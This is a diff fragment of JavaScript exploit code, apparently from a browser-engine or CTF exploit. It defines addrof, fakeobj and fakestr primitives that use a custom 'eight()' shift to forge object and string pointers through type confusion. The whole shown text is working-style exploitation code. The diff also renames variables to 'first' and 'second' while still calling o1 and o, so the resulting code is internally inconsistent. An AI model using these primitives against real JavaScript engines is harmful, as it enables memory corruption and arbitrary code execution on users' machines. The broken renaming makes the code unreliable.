@@ -16,32 +16,28 @@ let addrof = function(obj){
     return firsthalf + bitview[0];
 };
 let fakeobj = function(thing){
-    // javascript does funny truncating when using >>>, use this instead.
-    var temp = Math.pow(2, 32);
+    let temp = Math.pow(2, 32);
     bitview[1] = Math.floor(thing/temp);
     bitview[0] = thing >>> 0;
-    let o1 = {"gg" : 1, "ff" : floatview[0]};
-    // shift the first value plane
+    let first = {"int" : 420, "object" : floatview[0]};
     o1.eight();
-    let o = {"hi" : o1.gg, "bye" : -1};
-    // shift the second value plane
-    // suddenly, value of thing is now tagged with an object!
+    let second = {"val" : o1.gg, "floattag" : -1};
     o.eight();
     const result = o.hi;
-    // reshift to not corrupt pointers
+    
     o1.eight();
     o.eight();
     return result;
 };
 
 let fakestr = function(thing){
-    // javascript does funny truncating when using >>>, use this instead.
-    bitview[1] = Math.floor(thing / 2**(32));
+    let temp = Math.pow(2, 32);
+    bitview[1] = Math.floor(thing/temp);
     bitview[0] = thing >>> 0;
-    let o1 = {"gg" : 1, "ff" : floatview[0]};
+    let first = {"int" : 420, "object" : floatview[0]};
     // shift the first value plane
     o1.eight();
-    let o = {"hi" : o1.gg, "bye" : -7};
+    let second = {"val" : o1.gg, "floattag" : -7};
     // shift the second value plane
     // suddenly, value of thing is now tagged with a str!
     o.eight();
